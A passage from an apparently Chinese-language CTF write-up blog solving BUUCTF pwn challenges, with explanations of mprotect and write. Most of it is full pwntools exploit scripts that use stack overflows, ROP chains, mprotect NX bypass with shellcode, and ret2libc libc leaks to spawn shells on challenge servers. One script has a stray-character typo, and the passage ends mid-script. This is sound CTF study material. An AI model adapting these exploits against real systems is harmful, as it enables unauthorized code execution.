class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="13-get-started-3dsctf-2016"><a href="#13-get-started-3dsctf-2016" class="headerlink" title="13 get_started_3dsctf_2016"></a>13 get_started_3dsctf_2016</h2><ul>
<li><p>通过mprotect()函数改内存为可读可写可执行</p>
</li>
<li><p>加入read函数</p>
</li>
<li><p>在read函数中构造shellcode</p>
</li>
</ul>
<p>至于为什么是0x80EB000而不是bss段的开头0x80EBF80。</p>
<blockquote>
<p> 因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25636</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">pop_ret = <span class="number">0x0804951D</span><span class="comment"># 这里是一个有三个寄存器的pop_ret</span></span><br><span class="line">mprotect_addr = elf.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">mem_addr = <span class="number">0x80EB000</span></span><br><span class="line">mem_size = <span class="number">0x1000</span></span><br><span class="line">mem_proc = <span class="number">0x7</span></span><br><span class="line">read_addr = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用mprotect函数</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">payload+=p32(mprotect_addr)</span><br><span class="line">payload+=p32(pop_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填充mprotect参数</span></span><br><span class="line">payload+=p32(mem_addr)</span><br><span class="line">payload+=p32(mem_size)</span><br><span class="line">payload+=p32(mem_proc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用read函数</span></span><br><span class="line">payload+=p32(read_addr)</span><br><span class="line">payload+=p32(pop_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填充read参数</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mem_addr)</span><br><span class="line">payload+=p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read返回后跳转到shellcode所在地址</span></span><br><span class="line">payload+=p32(mem_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="int-mprotect-void-addr-size-t-len-int-prot-NX保护绕过"><a href="#int-mprotect-void-addr-size-t-len-int-prot-NX保护绕过" class="headerlink" title="int mprotect(void *addr, size_t len, int prot);  (NX保护绕过)"></a>int mprotect(void *addr, size_t len, int prot);  (NX保护绕过)</h3><ul>
<li>*<em>void <em>addr</em></em>：目标内存区域的起始地址，<strong>必须按页对齐</strong>（对齐到系统页大小）<ul>
<li><strong>页</strong>是操作系统管理内存的最小单位，大小通常为4KB(4096字节)或2MB(64位某些情况下的大页内存），页对齐是指内存地址必须是页大小的整数倍</li>
</ul>
</li>
<li><strong>size_t len</strong><ul>
<li>要修改权限的内存区域长度，<strong>必须是页大小的整数倍</strong></li>
</ul>
</li>
<li><strong>int prot</strong>：权限标志位，通过位掩码组合<ul>
<li>PROT_READ(可读)</li>
<li>PROT_WRITE(可写）</li>
<li>PROT_EXEC(可执行)</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功：返回<code>0</code></li>
<li>失败：返回<code>-1</code>，并设置<code>errno</code></li>
</ul>
</li>
</ul>
<h2 id="14-HarekazeCTF2019-baby-rop"><a href="#14-HarekazeCTF2019-baby-rop" class="headerlink" title="14 [HarekazeCTF2019]baby_rop"></a>14 [HarekazeCTF2019]baby_rop</h2><p>ROP构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = <span class="number">0x601048</span></span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line">ret = <span class="number">0x400479</span>`<span class="number">0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="15-others-shellcode"><a href="#15-others-shellcode" class="headerlink" title="15 others_shellcode"></a>15 others_shellcode</h2><p>我没看明白这题想干嘛，反正直接nc就getshell了，那就这样吧，似乎是直接进行了…</p>
<h2 id="16-OGeek2019-babyrop"><a href="#16-OGeek2019-babyrop" class="headerlink" title="16 [OGeek2019]babyrop"></a>16 [OGeek2019]babyrop</h2><p>感觉这题有些难度，稍微讲一下吧</p>
<p><code>checksec</code>一下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/buuctf/16/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>可以看到没有<code>canary</code>保护</p>
<p>看一下主函数怎么说：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在fd大于0的时候会读取数据，来到<code>sub_804871F</code>里看看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_804871F</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20u</span>);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现在<code>if (strncmp(buf, s, v1))</code>函数这里，如果<code>s</code>和<code>buf</code>的长度不一样就会退出程序</p>
<p><strong>但是这个函数本质上和<code>strlen</code>一样，在判断的字符串前加上<code>\x00</code>就直接跳过了，所以我们在输入的垃圾字符第一位加上<code>\x00</code>就行</strong></p>
<p>可以看到函数会将<code>buf</code>这个<code>char</code>型数组的<code>buf[7]</code>传出来给v2，再传递给<code>sub_80487D0(v2)</code></p>
<p>去<code>sub_80487D0(v2)</code>里看看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">sub_80487D0</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xC8u</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这个里面的<code>read</code>读取数据的大小取决于传入的<code>a1</code>(其实就是<code>v2</code>，也就是<code>buf[7]</code>)</p>
<p>所以我们将<code>buf[7]</code>取到它的最大值（’\xff’)，这个时候就可以通过溢出来构造<code>ret2libc</code></p>
<h3 id="ssize-t-write-int-fd-const-void-buf-size-t-count"><a href="#ssize-t-write-int-fd-const-void-buf-size-t-count" class="headerlink" title="*ssize_t write(int fd, const void buf, size_t count);"></a>*<em>ssize_t write(int fd, const void <em>buf, size_t count);</em></em></h3><ul>
<li><strong>fd</strong>:文件描述符，代表要写入的目标<ul>
<li><strong>0</strong>：标准输入（通常不用于写入）</li>
<li><strong>1</strong>：标准输出（默认输出到终端）</li>
<li><strong>2</strong>：标准错误（默认输出到终端）</li>
</ul>
</li>
<li>*<em>const void <em>buf</em></em>:指向待写入数据的缓冲区指针</li>
<li><strong>size_t count</strong>:要写入的字节数（从<code>buf</code>中读取的字节数）<ul>
<li>如果<code>count</code>为0，不会写入数据，但仍会检查文件描述符的有效性</li>
</ul>
</li>
<li><strong>返回值:</strong><ul>
<li>成功：返回实际写入的字节数</li>
<li>失败：返回<code>-1</code>，并设置<code>error</code>标识错误类型</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)	<span class="comment"># 题目描述里有下载libc-2.23.so的网址</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,27450)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">ret=<span class="number">0x08048502</span></span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr=<span class="number">0x08048825</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># 		溢出+覆盖+根据plt调用+返回main地址+wirte第一个参数+wirte第二个参数+write第三个参数</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">bin_sh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;bin/sh&#x27;</span>))</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="17-ciscn-2019-n-5"><a href="#17-ciscn-2019-n-5" class="headerlink" title="17 ciscn_2019_n_5"></a>17 ciscn_2019_n_5</h2><p>有两种做法，第一种应该是题目的原意，但是我的ubuntu版本比较高，出现了一些问题，就直接当作<code>ret2libc</code>来写了</p>
<p>第一种：</p>
<p>因为第一次输入name的地方很大并且可执行，所以写入<code>shellcode</code>，然后跳转到name的地址就好</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25442</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name\n&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;me?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x601080</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>第二种：</p>
<p>直接当作<code>ret2libc</code>来写，第二次的时候可以先把<code>/bin/sh</code>写入name中，然后调用name里的，记得先<code>ret</code>对齐一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25442</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400713</span></span><br><span class="line">ret = <span class="number">0x00000000004004c9</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;me?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;name\n&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span> +<span class="number">8</span>) +p64(ret) +p64(pop_rdi) +p64(<span class="number">0x601080</span>) +p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;me?\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><em>LibcSearcher选择第6个</em></p>
<h2 id="18-not-the-same-3dsctf-2016"><a href="#18-not-the-same-3dsctf-2016" class="headerlink" title="18 not_the_same_3dsctf_2016"></a>18 not_the_same_3dsctf_2016</h2><p>ida里面可以看到，在main函数上面的<code>get_secret</code>函数将<code>flag.txt</code>里的内容读入到了<code>bss</code>段，那么可以用<code>write</code>函数将其打印出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27329</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">write_addr = elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">flag = <span class="number">0x80ECA2D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">45</span>+p32(<span class="number">0x80489A0</span>)+p32(write_addr)+p32(<span class="number">0</span>)+p32(<span class="number">1</span>)+p32(flag)+p32(<span class="number">42</span>)</span><br><span class="line"><span class="comment"># 填充+读取flag函数跳转+write函数调用+write返回后的地址+fd参数+flag地址+输出字节数</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="19-ciscn-2019-en-2"><a href="#19-ciscn-2019-en-2" class="headerlink" title="19 ciscn_2019_en_2"></a>19 ciscn_2019_en_2</h2><p><code>ret2libc</code>,没啥好说的，跟之前有一题很像</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29048</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;choice!\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;encrypted\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span 